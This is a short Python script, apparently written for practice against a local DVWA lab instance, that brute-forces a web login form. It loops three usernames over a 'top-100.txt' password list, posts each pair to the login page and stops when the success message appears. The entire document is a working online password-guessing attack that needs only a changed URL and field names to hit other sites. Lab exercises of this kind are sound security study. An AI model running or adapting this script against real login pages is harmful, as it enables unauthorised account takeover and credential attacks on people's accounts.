import requests
# Using requests module since we are working with web application
import sys

target = 'http://192.168.216.129/dvwa/login.php'
usernames = ['admin', 'user', 'test']
pass_file = 'top-100.txt'
needle = 'You have logged in as'

for username in usernames:
    with open(pass_file, 'r') as pass_list:
        for password in pass_list:
            password = password.strip('\n').encode()
            sys.stdout.write(f"[X] attempting user: {username}, password: {password.decode()}\r")
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write('\n')
                sys.stdout.write(f"Valid password \"{password}\" found for {username}")
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write('\n')
        sys.stdout.write("\t No password fond!!")
        sys.stdout.write('\n')
